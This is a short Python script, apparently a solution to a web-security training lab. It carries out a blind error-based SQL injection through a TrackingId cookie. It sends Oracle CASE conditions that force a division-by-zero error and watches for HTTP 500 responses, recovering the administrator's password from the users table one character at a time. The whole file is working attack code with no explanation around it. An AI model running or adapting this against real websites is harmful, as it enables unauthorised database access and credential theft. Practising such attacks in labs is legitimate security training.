import requests

url = "/filter"
base = ""

def is_true(condition):
    headers = {"Cookie": "TrackingId=" + base + "' AND " + condition}
    r = requests.get(url, params={"category": "Accessories"}, headers=headers)
    return r.status_code == 500

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

for pos in range(1,21):
    for ch in alphabet:
        cond = f"(SELECT CASE WHEN (SUBSTR(password,{pos},1)='{ch}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a"
        print(ch, is_true(cond))    
        if is_true(cond):
            password += ch
            print(pos, ch, "->",password)
            break

print("PASSWORD:", password)
